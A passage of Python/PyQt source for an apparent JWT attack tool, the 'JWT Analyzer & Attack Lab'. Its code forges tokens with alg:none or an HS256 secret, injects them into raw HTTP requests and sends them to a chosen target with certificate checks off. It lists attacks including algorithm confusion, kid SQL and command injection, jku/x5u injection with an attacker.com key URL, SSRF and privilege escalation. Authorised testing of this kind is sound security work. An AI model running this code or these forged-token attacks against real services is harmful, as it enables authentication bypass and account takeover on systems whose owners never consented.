                    extra_headers=self._extra_headers or None,
                )
                self.result_ready.emit(row, status, body, headers, elapsed, "", sent_req)
            except Exception as exc:
                self.result_ready.emit(row, 0, "", {}, 0.0, str(exc), "")
            if self._delay_ms > 0 and not self._stop:
                _time.sleep(self._delay_ms / 1000.0)
        self.all_done.emit()


def _send_http_request(
    raw_request: str,
    host: str,
    port: int,
    is_https: bool,
    forged_token: str,
    jwt_location: str,  # "Authorization", "Cookie:<name>", "Body", "custom:<header>"
    timeout_s: int = 20,
    extra_headers: Optional[Dict[str, str]] = None,
) -> Tuple[int, str, Dict[str, str], float]:
    """
    Inject *forged_token* into the correct position of *raw_request* and
    send it.  Returns (status_code, body_text, response_headers, elapsed_ms).
    """
    raw = raw_request
    # Special case: no-token probe — strip the JWT from the request entirely
    if forged_token == "__NO_TOKEN__":
        old_m = re.search(r'eyJ[\w\-]+\.eyJ[\w\-]+\.[\w\-]*', raw)
        if old_m:
            old_tok = old_m.group(0)
            if jwt_location.startswith("Authorization"):
                raw = re.sub(r'(?im)^Authorization:[^\r\n]*\r?\n', '', raw)
            elif jwt_location.startswith("Cookie:"):
                cookie_name = jwt_location.split(":", 1)[1].strip()
                raw = re.sub(rf'(?i){re.escape(cookie_name)}={re.escape(old_tok)};?\s*', '', raw)
            else:
                raw = raw.replace(old_tok, "")
    # Normal injection path
    elif jwt_location.startswith("Authorization"):
        raw = re.sub(
            r'(?im)(^Authorization:\s*Bearer\s+)([\w\-\.]+)',
            lambda m: m.group(1) + forged_token,
            raw,
        )
        if "Authorization:" not in raw and "authorization:" not in raw:
            # Insert after first line
            idx = raw.index("\n")
            raw = raw[:idx + 1] + f"Authorization: Bearer {forged_token}\n" + raw[idx + 1:]
    elif jwt_location.startswith("Cookie:"):
        cookie_name = jwt_location.split(":", 1)[1].strip()
        raw = re.sub(
            rf'(?i)({re.escape(cookie_name)}=)([\w\-\.]+)',
            lambda m: m.group(1) + forged_token,
            raw,
        )
    elif jwt_location.startswith("custom:"):
        header_name = jwt_location.split(":", 1)[1].strip()
        raw = re.sub(
            rf'(?im)(^{re.escape(header_name)}:\s*)([\w\-\.]+)',
            lambda m: m.group(1) + forged_token,
            raw,
        )
    else:
        # Generic: replace old token anywhere in the request
        old_token_m = re.search(r'(eyJ[\w\-]+\.eyJ[\w\-]+\.[\w\-]*)', raw_request)
        if old_token_m:
            raw = raw.replace(old_token_m.group(1), forged_token)

    parsed = _parse_raw_request(raw)
    method = parsed["method"]
    path = parsed["path"]
    headers = parsed["headers"]
    body = parsed["body"]

    # Inject any extra headers (e.g. ngrok-skip-browser-warning)
    if extra_headers:
        headers.update(extra_headers)

    # Build the actual HTTP connection
    scheme = "https" if is_https else "http"
    if not host:
        host = parsed.get("host", "localhost")
    actual_port = port

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    t0 = time.time()
    try:
        if is_https:
            conn = __import__("http.client", fromlist=["HTTPSConnection"]).HTTPSConnection(
                host, actual_port, context=ctx, timeout=timeout_s
            )
        else:
            conn = __import__("http.client", fromlist=["HTTPConnection"]).HTTPConnection(
                host, actual_port, timeout=timeout_s
            )
        conn.request(method, path, body=body.encode() if body else None, headers=headers)
        resp = conn.getresponse()
        status = resp.status
        resp_headers = dict(resp.getheaders())
        raw_body = resp.read(1024 * 512)   # max 512 KB
        # Decompress if server sent encoded content
        content_enc = resp.getheader("Content-Encoding", "").lower()
        if "gzip" in content_enc:
            import gzip as _gzip
            try:
                raw_body = _gzip.decompress(raw_body)
            except Exception:
                pass
        elif "deflate" in content_enc:
            import zlib as _zlib
            try:
                raw_body = _zlib.decompress(raw_body)
            except Exception:
                try:
                    raw_body = _zlib.decompress(raw_body, -15)
                except Exception:
                    pass
        elif "br" in content_enc:
            try:
                import brotli as _brotli
                raw_body = _brotli.decompress(raw_body)
            except Exception:
                pass
        elif "zstd" in content_enc:
            try:
                import zstandard as _zstd
                raw_body = _zstd.ZstdDecompressor().decompress(raw_body)
            except Exception:
                pass
        try:
            body_text = raw_body.decode("utf-8", errors="replace")
        except Exception:
            body_text = repr(raw_body)
        elapsed = (time.time() - t0) * 1000
        conn.close()
        return status, body_text, resp_headers, elapsed, raw
    except Exception as exc:
        elapsed = (time.time() - t0) * 1000
        raise RuntimeError(f"{exc}") from exc


# ─────────────────────────────────────────────────────────────────────────────
# Baseline Worker
# ─────────────────────────────────────────────────────────────────────────────

class BaselineWorker(QThread):
    """Send the original unmodified request to record a baseline status + response length."""
    baseline_done = pyqtSignal(int, str, dict, float, str)   # status_code, body, headers, elapsed_ms, sent_req

    def __init__(self, raw_request: str, host: str, port: int, is_https: bool,
                 original_token: str, location: str, parent=None):
        super().__init__(parent)
        self._raw = raw_request
        self._host = host
        self._port = port
        self._https = is_https
        self._token = original_token
        self._location = location

    def run(self):
        try:
            status, body, headers, elapsed, sent = _send_http_request(
                self._raw, self._host, self._port, self._https,
                self._token, self._location
            )
            self.baseline_done.emit(status, body, headers, elapsed, sent)
        except Exception:
            self.baseline_done.emit(0, "", {}, 0.0, "")


# ─────────────────────────────────────────────────────────────────────────────
# Token Editor Dialog
# ─────────────────────────────────────────────────────────────────────────────

class TokenEditDialog(QDialog):
    """Edit JWT payload claims then re-forge the token."""

    token_forged = pyqtSignal(str)  # emits the new token string

    def __init__(self, header: dict, payload: dict, parent=None):
        super().__init__(parent)
        self.setWindowTitle("JWT Claim Editor")
        self.setModal(True)
        self.setMinimumSize(700, 500)
        self._header = copy.deepcopy(header)
        self._payload = copy.deepcopy(payload)
        self._build_ui()

    def _build_ui(self):
        layout = QVBoxLayout(self)
        layout.setSpacing(10)
        layout.setContentsMargins(12, 12, 12, 12)

        lbl = QLabel("Edit the header and payload JSON below, then choose a signing option.")
        lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:9pt;")
        layout.addWidget(lbl)

        splitter = QSplitter(Qt.Horizontal)

        # Header editor
        hdr_box = QGroupBox("Header")
        hdr_box.setStyleSheet(self._grp_style())
        hdr_lay = QVBoxLayout(hdr_box)
        self.header_edit = QTextEdit()
        self.header_edit.setPlainText(json.dumps(self._header, indent=2))
        self.header_edit.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 10))
        JSONHighlighter(self.header_edit.document())
        hdr_lay.addWidget(self.header_edit)
        splitter.addWidget(hdr_box)

        # Payload editor
        pay_box = QGroupBox("Payload")
        pay_box.setStyleSheet(self._grp_style())
        pay_lay = QVBoxLayout(pay_box)
        self.payload_edit = QTextEdit()
        self.payload_edit.setPlainText(json.dumps(self._payload, indent=2))
        self.payload_edit.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 10))
        JSONHighlighter(self.payload_edit.document())
        pay_lay.addWidget(self.payload_edit)
        splitter.addWidget(pay_box)

        layout.addWidget(splitter)

        # Signing row
        sign_row = QHBoxLayout()
        sign_row.addWidget(QLabel("Sign with:"))
        self.sign_combo = QComboBox()
        self.sign_combo.addItems([
            "No signature (alg:none)",
            "HS256 + custom secret",
            "Keep original header/sig",
        ])
        self.sign_combo.currentIndexChanged.connect(self._on_sign_method_changed)
        sign_row.addWidget(self.sign_combo)

        self.secret_edit = QLineEdit()
        self.secret_edit.setPlaceholderText("HMAC secret (for HS256)")
        self.secret_edit.setVisible(False)
        sign_row.addWidget(self.secret_edit)
        layout.addLayout(sign_row)

        # Preview
        preview_lbl = QLabel("Forged Token Preview:")
        preview_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};")
        layout.addWidget(preview_lbl)
        self.token_preview = QTextEdit()
        self.token_preview.setReadOnly(True)
        self.token_preview.setMaximumHeight(60)
        self.token_preview.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        self.token_preview.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:{COLOR_SUCCESS}; border:1px solid {COLOR_BORDER};"
        )
        JWTHighlighter(self.token_preview.document())
        layout.addWidget(self.token_preview)

        # Buttons
        btn_row = QHBoxLayout()
        forge_btn = QPushButton("Forge Token")
        forge_btn.setStyleSheet(self._btn_style(COLOR_ACCENT))
        forge_btn.clicked.connect(self._forge)
        copy_btn = QPushButton("Copy")
        copy_btn.clicked.connect(self._copy)
        copy_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        use_btn = QPushButton("Use Token")
        use_btn.setStyleSheet(self._btn_style("#4A90D9"))
        use_btn.clicked.connect(self._use_token)
        cancel_btn = QPushButton("Cancel")
        cancel_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        cancel_btn.clicked.connect(self.reject)
        for b in [forge_btn, copy_btn, use_btn, cancel_btn]:
            btn_row.addWidget(b)
        layout.addLayout(btn_row)

        self._forge()

    def _on_sign_method_changed(self, idx):
        self.secret_edit.setVisible(idx == 1)
        self._forge()

    def _forge(self):
        try:
            hdr = json.loads(self.header_edit.toPlainText())
            pay = json.loads(self.payload_edit.toPlainText())
        except json.JSONDecodeError as e:
            self.token_preview.setPlainText(f"[JSON Error] {e}")
            return
        idx = self.sign_combo.currentIndex()
        if idx == 0:  # none
            hdr["alg"] = "none"
            h_b64 = _encode_part(hdr)
            p_b64 = _encode_part(pay)
            self._current_token = f"{h_b64}.{p_b64}."
        elif idx == 1:  # HS256
            hdr["alg"] = "HS256"
            secret = self.secret_edit.text().encode() or b"secret"
            h_b64 = _encode_part(hdr)
            p_b64 = _encode_part(pay)
            sig = _sign_hs256(h_b64, p_b64, secret)
            self._current_token = f"{h_b64}.{p_b64}.{sig}"
        else:
            h_b64 = _encode_part(hdr)
            p_b64 = _encode_part(pay)
            self._current_token = f"{h_b64}.{p_b64}.<original-sig>"
        self.token_preview.setPlainText(self._current_token)

    def _copy(self):
        QApplication.clipboard().setText(getattr(self, "_current_token", ""))

    def _use_token(self):
        t = getattr(self, "_current_token", "")
        if t:
            self.token_forged.emit(t)
            self.accept()

    @staticmethod
    def _grp_style() -> str:
        return (
            f"QGroupBox {{ color:{COLOR_TEXT_BRIGHT}; font-weight:bold;"
            f" border:1px solid {COLOR_BORDER}; border-radius:4px; margin-top:8px; padding-top:4px;}}"
            f"QGroupBox::title {{ subcontrol-origin:margin; left:8px; }}"
        )

    @staticmethod
    def _btn_style(bg: str) -> str:
        return (
            f"QPushButton {{ background:{bg}; color:{COLOR_TEXT_BRIGHT}; border:none;"
            f" border-radius:4px; padding:6px 14px; font-weight:bold; }}"
            f"QPushButton:hover {{ background:{COLOR_ELEVATED_BG}; }}"
        )


# ─────────────────────────────────────────────────────────────────────────────
# Main JWT Tab Widget
# ─────────────────────────────────────────────────────────────────────────────

class JWTTab(QWidget):
    """Main JWT Analyzer & Attack Lab tab."""

    # Emitted when the user presses "Send to Repeater" from the results table
    send_to_repeater_signal = pyqtSignal(str)

    def __init__(self, parent=None):
        super().__init__(parent)
        self._parent_gui = parent
        self._parsed_request: Dict[str, Any] = {}
        self._jwt_token: str = ""
        self._jwt_header: dict = {}
        self._jwt_payload: dict = {}
        self._jwt_sig: str = ""
        self._jwt_location: str = "Authorization"
        self._attack_results: List[AttackResult] = []
        self._worker: Optional[RequestWorker] = None
        self._host: str = ""
        self._port: int = 443
        self._is_https: bool = True
        self._baseline_status: int = 0
        self._baseline_length: int = 0
        self._baseline_worker: Optional[QThread] = None
        self._pending_tasks: list = []
        self._managed_keys: List[dict] = []       # Key Manager session storage
        self._local_jwks_server: Optional[LocalJWKSServer] = None  # local JWKS HTTP server
        self._srv_key_data: Optional[dict] = None             # key currently hosted by local server
        self._ngrok_tunnel: Optional[NgrokTunnel] = None     # ngrok tunnel thread
        self._srv_jwks_json: str = ""                         # JWKS JSON saved for port-retry
        self._srv_port_retry: int = 0                         # how many times we've bumped the port
        self._setup_ui()

    # ─────────────────────────────────────────────────────────────────────
    # UI construction
    # ─────────────────────────────────────────────────────────────────────

    def _setup_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # ── Top-level sub-tabs: Analyzer | Key Manager ───────────────────
        self._main_tabs = QTabWidget()
        self._main_tabs.setDocumentMode(True)
        self._main_tabs.setStyleSheet(
            f"QTabWidget::pane {{ border:none; background:{COLOR_BACKGROUND}; }}"
            f"QTabBar::tab {{ background:{COLOR_ELEVATED_BG}; color:{COLOR_TEXT_MUTED};"
            f" padding:6px 18px; font-size:10pt; border:1px solid {COLOR_BORDER};"
            f" border-bottom:none; border-top-left-radius:4px; border-top-right-radius:4px;"
            f" margin-right:2px; }}"
            f"QTabBar::tab:selected {{ background:{COLOR_DARK_BG}; color:{COLOR_TEXT_BRIGHT};"
            f" border-bottom:2px solid {COLOR_ACCENT}; font-weight:bold; }}"
        )

        # ── Tab 1 : Analyzer ─────────────────────────────────────────
        analyzer_w = QWidget()
        analyzer_lay = QVBoxLayout(analyzer_w)
        analyzer_lay.setContentsMargins(8, 8, 8, 8)
        analyzer_lay.setSpacing(6)

        analyzer_lay.addLayout(self._build_top_bar())

        splitter = QSplitter(Qt.Horizontal)
        splitter.addWidget(self._build_left_panel())
        splitter.addWidget(self._build_right_panel())
        splitter.setSizes([480, 720])
        analyzer_lay.addWidget(splitter, 1)

        self.status_lbl = QLabel("Ready — paste a raw HTTP request and click 'Parse JWT'")
        self.status_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:9pt; padding:2px 4px;")
        analyzer_lay.addWidget(self.status_lbl)

        self._main_tabs.addTab(analyzer_w, "Analyzer")

        # ── Tab 2 : Key Manager ───────────────────────────────────────
        self._main_tabs.addTab(self._build_key_manager_tab(), "Key Manager")

        root.addWidget(self._main_tabs)

    def _build_top_bar(self) -> QHBoxLayout:
        row = QHBoxLayout()
        row.setSpacing(8)

        icon_lbl = QLabel("JWT Analyzer & Attack Lab")
        icon_lbl.setStyleSheet(
            f"color:{COLOR_TEXT_BRIGHT}; font-size:13pt; font-weight:bold;"
        )
        row.addWidget(icon_lbl)
        row.addStretch()

        lbl_host = QLabel("Host:")
        lbl_host.setStyleSheet(f"color:{COLOR_TEXT_MUTED};")
        row.addWidget(lbl_host)
        self.host_edit = QLineEdit()
        self.host_edit.setPlaceholderText("target.com")
        self.host_edit.setFixedWidth(200)
        self.host_edit.setStyleSheet(self._input_style())
        row.addWidget(self.host_edit)

        lbl_port = QLabel("Port:")
        lbl_port.setStyleSheet(f"color:{COLOR_TEXT_MUTED};")
        row.addWidget(lbl_port)
        self.port_spin = QSpinBox()
        self.port_spin.setRange(1, 65535)
        self.port_spin.setValue(443)
        self.port_spin.setFixedWidth(70)
        self.port_spin.setStyleSheet(self._input_style())
        row.addWidget(self.port_spin)

        self.https_cb = QCheckBox("HTTPS")
        self.https_cb.setChecked(True)
        self.https_cb.setStyleSheet(f"color:{COLOR_TEXT};")
        self.https_cb.toggled.connect(self._on_https_toggled)
        row.addWidget(self.https_cb)

        return row

    def _build_left_panel(self) -> QWidget:
        # Two-tab left panel: "Request & JWT" | "Attack Config"
        left_tabs = QTabWidget()
        left_tabs.setDocumentMode(True)
        left_tabs.setStyleSheet(self._subtabs_style())

        # ══ Tab 1: Request & JWT ══════════════════════════════════════════
        req_jwt_widget = QWidget()
        rj_lay = QVBoxLayout(req_jwt_widget)
        rj_lay.setContentsMargins(0, 4, 0, 0)
        rj_lay.setSpacing(0)

        req_jwt_splitter = QSplitter(Qt.Vertical)

        # ── HTTP Request group ────────────────────────────────────────────
        req_grp = QGroupBox("HTTP Request")
        req_grp.setStyleSheet(self._grp_style())
        req_lay = QVBoxLayout(req_grp)
        req_lay.setSpacing(4)

        req_toolbar = QHBoxLayout()
        parse_btn = QPushButton("Parse JWT")
        parse_btn.setToolTip("Extract and decode JWT from the request above")
        parse_btn.setStyleSheet(self._btn_style(COLOR_ACCENT))
        parse_btn.clicked.connect(self.parse_jwt)
        req_toolbar.addWidget(parse_btn)

        clear_btn = QPushButton("Clear")
        clear_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        clear_btn.clicked.connect(lambda: self.request_edit.clear())
        req_toolbar.addWidget(clear_btn)

        req_toolbar.addStretch()
        lbl_loc = QLabel("JWT in:")
        lbl_loc.setStyleSheet(f"color:{COLOR_TEXT_MUTED};")
        req_toolbar.addWidget(lbl_loc)
        self.location_combo = QComboBox()
        self.location_combo.addItems([
            "Authorization: Bearer",
            "Cookie (auto-detect)",
            "Request Body",
            "Custom Header",
        ])
        self.location_combo.setFixedWidth(180)
        self.location_combo.setStyleSheet(self._input_style())
        req_toolbar.addWidget(self.location_combo)
        req_lay.addLayout(req_toolbar)

        self.request_edit = QTextEdit()
        self.request_edit.setPlaceholderText(
            "Paste a raw HTTP request here…\n\n"
            "Example:\n"
            "GET /api/profile HTTP/1.1\n"
            "Host: target.com\n"
            "Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.sig\n"
        )
        self.request_edit.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        HttpSyntaxHighlighter(self.request_edit.document())
        self.request_edit.setStyleSheet(
            f"background:{COLOR_DARK_BG}; color:{COLOR_TEXT};"
            f" border:1px solid {COLOR_BORDER}; border-radius:4px;"
        )
        self.request_edit.setMinimumHeight(160)
        req_lay.addWidget(self.request_edit)
        req_jwt_splitter.addWidget(req_grp)

        # ── JWT View group ────────────────────────────────────────────────
        dec_grp = QGroupBox("JWT View")
        dec_grp.setStyleSheet(self._grp_style())
        dec_lay = QVBoxLayout(dec_grp)
        dec_lay.setSpacing(4)

        token_row = QHBoxLayout()
        token_lbl = QLabel("Token:")
        token_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED}; font-size:9pt;")
        token_row.addWidget(token_lbl)
        self.token_display = QLineEdit()
        self.token_display.setReadOnly(False)
        self.token_display.setPlaceholderText("JWT token will appear here after parsing...")
        self.token_display.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 8))
        self.token_display.setStyleSheet(self._input_style())
        self.token_display.textChanged.connect(self._on_token_display_changed)
        token_row.addWidget(self.token_display)
        copy_tok_btn = QPushButton("Copy")
        copy_tok_btn.setFixedWidth(42)
        copy_tok_btn.setToolTip("Copy token")
        copy_tok_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        copy_tok_btn.clicked.connect(lambda: QApplication.clipboard().setText(self.token_display.text()))
        token_row.addWidget(copy_tok_btn)
        edit_tok_btn = QPushButton("Edit")
        edit_tok_btn.setFixedWidth(42)
        edit_tok_btn.setToolTip("Open token editor / claim forger")
        edit_tok_btn.setStyleSheet(self._btn_style(COLOR_DARK_BG))
        edit_tok_btn.clicked.connect(self._open_token_editor)
        token_row.addWidget(edit_tok_btn)
        dec_lay.addLayout(token_row)

        decode_tabs = QTabWidget()
        decode_tabs.setDocumentMode(True)
        decode_tabs.setStyleSheet(self._subtabs_style())

        self.header_view = QTextEdit()
        self.header_view.setReadOnly(True)
        self.header_view.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        self.header_view.setStyleSheet(f"background:{COLOR_DARK_BG}; color:#61AFEF; border:none;")
        JSONHighlighter(self.header_view.document())
        decode_tabs.addTab(self.header_view, "Header")

        self.payload_view = QTextEdit()
        self.payload_view.setReadOnly(True)
        self.payload_view.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        self.payload_view.setStyleSheet(f"background:{COLOR_DARK_BG}; color:#98C379; border:none;")
        JSONHighlighter(self.payload_view.document())
        decode_tabs.addTab(self.payload_view, "Payload")

        self.sig_view = QTextEdit()
        self.sig_view.setReadOnly(True)
        self.sig_view.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        self.sig_view.setStyleSheet(f"background:{COLOR_DARK_BG}; color:#E06C75; border:none;")
        decode_tabs.addTab(self.sig_view, "Signature")

        self.verify_view = QTextEdit()
        self.verify_view.setReadOnly(True)
        self.verify_view.setFont(QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 9))
        self.verify_view.setStyleSheet(f"background:{COLOR_DARK_BG}; color:{COLOR_TEXT}; border:none;")
        decode_tabs.addTab(self.verify_view, "Analysis")

        dec_lay.addWidget(decode_tabs)
        req_jwt_splitter.addWidget(dec_grp)
        req_jwt_splitter.setSizes([280, 280])

        rj_lay.addWidget(req_jwt_splitter, 1)
        left_tabs.addTab(req_jwt_widget, "Request & JWT")

        # ══ Tab 2: Techniques ════════════════════════════════════════════════
        tech_widget = QWidget()
        tech_lay = QVBoxLayout(tech_widget)
        tech_lay.setContentsMargins(4, 4, 4, 4)
        tech_lay.setSpacing(4)

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet(f"border:none; background:{COLOR_CARD_BG};")
        scroll_content = QWidget()
        scroll_layout = QVBoxLayout(scroll_content)
        scroll_layout.setSpacing(4)
        scroll_layout.setContentsMargins(4, 4, 4, 4)

        self._attack_checks: Dict[str, QCheckBox] = {}

        # ── "Select All" master checkbox ─────────────────────────────────
        self._cb_select_all = QCheckBox("All (select / deselect all)")
        self._cb_select_all.setChecked(True)
        self._cb_select_all.setTristate(True)
        self._cb_select_all.setStyleSheet(
            f"color:{COLOR_TEXT_BRIGHT}; font-size:9pt; font-weight:bold;"
        )
        self._cb_select_all.toggled.connect(self._on_select_all_attacks)
        scroll_layout.addWidget(self._cb_select_all)

        sep = QFrame()
        sep.setFrameShape(QFrame.HLine)
        sep.setStyleSheet(f"color:{COLOR_BORDER};")
        scroll_layout.addWidget(sep)

        attack_defs = [
            # ── Single-technique attacks ──────────────────────────────────
            ("alg_none",              "alg:none / alg:false (no signature)",                True),
            ("alg_confusion",         "Algorithm Confusion (RS256 -> HS256)",               True),
            ("empty_sig",             "Empty / Null Signature",                             True),
            ("embedded_jwk",          "Embedded JWK Header Injection",                     True),
            ("jku_inject",            "jku Header Injection (SSRF/RS256)",                 True),
            ("x5u_inject",            "x5u Header Injection (SSRF/RS256)",                 True),
            ("x5c_inject",            "x5c Header Injection (self-signed cert embed)",     True),
            ("cty_inject",            "cty Header Injection (parser confusion)",            True),
            ("kid_sqli",              "kid SQL Injection",                                  True),
            ("kid_traversal",         "kid Path Traversal (../../dev/null)",                True),
            ("priv_esc",              "Privilege Escalation (role/admin claims)",           True),
            ("claim_tamper",          "Claim Tampering (custom claims)",                    True),
            ("exp_extend",            "Expiry Extension (+1 year)",                         True),
            ("null_claims",           "Null/Empty Subject Bypass",                          True),
            ("weak_secret",           "Weak Secret Brute-Force",                            True),
            ("claim_fuzz",            "Claim Fuzzer (try values per claim)",                True),
            # ── Mixed / Combined attacks ──────────────────────────────────
            ("mix_none_priv",         "MIX: alg:none + Privilege Escalation",              True),
            ("mix_none_exp",          "MIX: alg:none + Expiry Extension",                  True),
            ("mix_none_null",         "MIX: alg:none + Null Claims",                       True),
            ("mix_kid_sqli_none",     "MIX: kid SQLi + alg:none (double bypass)",          True),
            ("mix_jku_priv",          "MIX: jku Injection + Privilege Escalation",         True),
            ("mix_jwk_priv",          "MIX: Embedded JWK + Privilege Escalation",          True),
            ("mix_confusion_priv",    "MIX: RS256->HS256 + Privilege Escalation",          True),
            ("mix_full_bypass",       "MIX: FULL BYPASS (alg:none+admin+exp+nosig)",       True),
            # ── Additional exploit techniques ─────────────────────────────
            ("psychic_sig",           "Psychic Signature CVE-2022-21449 (ECDSA zero-sig)", True),
            ("blank_pw",              "Blank Password (empty HS256 secret)",                True),
            ("kid_rce",               "kid Command Injection (RCE via |cmd)",               True),
            ("type_confusion",        "Type Confusion Injection (null/bool/int per claim)", True),
            ("ssrf_claims",           "SSRF via Claim Injection (OOB trigger per claim)",   True),
            ("reflected",             "Reflected Claims (processing order bypass check)",   True),
            # ── sign2n ────────────────────────────────────────────────────
            ("sign2n",                 "RS256→HS256 (sign2n — recover key from 2 tokens)",  True),
        ]

        for key, label, default in attack_defs:
            cb = QCheckBox(label)
            cb.setChecked(default)
            cb.setStyleSheet(f"color:{COLOR_TEXT}; font-size:9pt;")
            cb.toggled.connect(self._on_attack_cb_changed)
            scroll_layout.addWidget(cb)
            self._attack_checks[key] = cb

        scroll_layout.addStretch()
        scroll.setWidget(scroll_content)
        tech_lay.addWidget(scroll)

        left_tabs.addTab(tech_widget, "Techniques")

        # ══ Tab 3: Attack Config ══════════════════════════════════════════
        atk_widget = QWidget()
        atk_lay = QVBoxLayout(atk_widget)
        atk_lay.setContentsMargins(0, 0, 0, 0)
        atk_lay.setSpacing(0)

        atk_scroll = QScrollArea()
        atk_scroll.setWidgetResizable(True)
        atk_scroll.setStyleSheet(f"border:none; background:{COLOR_CARD_BG};")
        atk_scroll_content = QWidget()
        atk_scroll_lay = QVBoxLayout(atk_scroll_content)
        atk_scroll_lay.setContentsMargins(4, 4, 4, 4)
        atk_scroll_lay.setSpacing(6)

        _grp = self._grp_style()
        _mono8 = QFont(FONT_FAMILY_MONO.split(",")[0].strip("' "), 8)
        _te_style = (
            f"background:{COLOR_DARK_BG}; color:{COLOR_TEXT};"
            f" border:1px solid {COLOR_BORDER};"
        )

        # ── Algorithm Confusion (RS256 → HS256) ───────────────────────────
        alg_conf_grp = QGroupBox("Algorithm Confusion  (RS256 → HS256)")
        alg_conf_grp.setStyleSheet(_grp)
        alg_conf_lay = QFormLayout(alg_conf_grp)
        alg_conf_lay.setSpacing(5)
        alg_conf_lay.setContentsMargins(6, 10, 6, 6)

        self.pubkey_input_edit = QPlainTextEdit()
        self.pubkey_input_edit.setPlaceholderText(
            '{"kty":"RSA","n":"…","e":"AQAB"}   ← JWK\n\n'
            "or\n\n"
            "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----   ← PEM"
        )
        self.pubkey_input_edit.setMinimumHeight(80)
        self.pubkey_input_edit.setMaximumHeight(110)
        self.pubkey_input_edit.setFont(_mono8)
        self.pubkey_input_edit.setStyleSheet(_te_style)
        self.pubkey_edit = self.pubkey_input_edit
        alg_conf_lay.addRow("RSA PubKey\n(JWK / PEM):", self.pubkey_input_edit)
        atk_scroll_lay.addWidget(alg_conf_grp)

        # ── sign2n  (RS256 → HS256 via key recovery) ──────────────────────
        sign2n_grp = QGroupBox("RS256 → HS256 via sign2n  (key recovery from 2 tokens)")
        sign2n_grp.setStyleSheet(_grp)
        sign2n_lay = QFormLayout(sign2n_grp)
        sign2n_lay.setSpacing(5)
        sign2n_lay.setContentsMargins(6, 10, 6, 6)

        self.sign2n_tok1_edit = QPlainTextEdit()
        self.sign2n_tok1_edit.setPlaceholderText(
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSJ9.<sig1>"
        )
        self.sign2n_tok1_edit.setMaximumHeight(52)
        self.sign2n_tok1_edit.setFont(_mono8)
        self.sign2n_tok1_edit.setStyleSheet(_te_style)
        sign2n_lay.addRow("Token 1:", self.sign2n_tok1_edit)

        self.sign2n_tok2_edit = QPlainTextEdit()
        self.sign2n_tok2_edit.setPlaceholderText(
            "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMiJ9.<sig2>"
        )
        self.sign2n_tok2_edit.setMaximumHeight(52)
        self.sign2n_tok2_edit.setFont(_mono8)
        self.sign2n_tok2_edit.setStyleSheet(_te_style)
        sign2n_lay.addRow("Token 2:", self.sign2n_tok2_edit)

        if _GMPY2_AVAILABLE:
            _g2_txt = "⚡  gmpy2/GMP detected — sign2n active (5–30 s per key)"
            _g2_col = "#4caf50"
        else:
            _g2_txt = "⚠  gmpy2 not installed — sign2n disabled.  Install: pip install gmpy2"
            _g2_col = "#e5c07b"
            self.sign2n_tok1_edit.setEnabled(False)
            self.sign2n_tok2_edit.setEnabled(False)
        _g2_lbl = QLabel(_g2_txt)
        _g2_lbl.setStyleSheet(
            f"color:{_g2_col}; font-size:8pt;"
            f" border:1px solid {_g2_col}; border-radius:3px; padding:2px 5px;"
        )
        _g2_lbl.setWordWrap(True)
        sign2n_lay.addRow(_g2_lbl)
        atk_scroll_lay.addWidget(sign2n_grp)

        # ── jku / x5u Header Injection ────────────────────────────────────
        jku_grp = QGroupBox("jku / x5u Header Injection")
        jku_grp.setStyleSheet(_grp)
        jku_lay = QFormLayout(jku_grp)
        jku_lay.setSpacing(5)
        jku_lay.setContentsMargins(6, 10, 6, 6)

        self.attacker_url_edit = QLineEdit()
        self.attacker_url_edit.setPlaceholderText("https://attacker.com/jwks.json")
        self.attacker_url_edit.setStyleSheet(self._input_style())
        jku_lay.addRow("Attacker URL:", self.attacker_url_edit)

        self.jku_km_key_combo = QComboBox()
        self.jku_km_key_combo.setStyleSheet(self._input_style())
        self.jku_km_key_combo.setToolTip(
            "RSA key used to sign jku/x5u tokens.\n"
            "'(auto)' uses the Key Manager table selection or the key\n"
            "currently hosted by the local JWKS server.\n"
            "Generate keys in the Key Manager tab."
        )
        self.jku_km_key_combo.addItem("(auto — Key Manager selection / server key)", None)
        jku_lay.addRow("RSA Key:", self.jku_km_key_combo)

        self.trusted_domain_edit = QLineEdit()
        self.trusted_domain_edit.setPlaceholderText(
            "e.g. trusted.example.com — enables allow-list bypass variants"
        )
        self.trusted_domain_edit.setStyleSheet(self._input_style())
        jku_lay.addRow("Trusted Domain:", self.trusted_domain_edit)
        atk_scroll_lay.addWidget(jku_grp)

        # ── General / Shared ──────────────────────────────────────────────
        gen_grp = QGroupBox("General")
        gen_grp.setStyleSheet(_grp)
        gen_lay = QFormLayout(gen_grp)
        gen_lay.setSpacing(5)
        gen_lay.setContentsMargins(6, 10, 6, 6)

        self.canary_edit = QLineEdit()
        self.canary_edit.setPlaceholderText("String to find in response body (e.g. Welcome, admin)")
        self.canary_edit.setStyleSheet(self._input_style())
        gen_lay.addRow("Canary:", self.canary_edit)

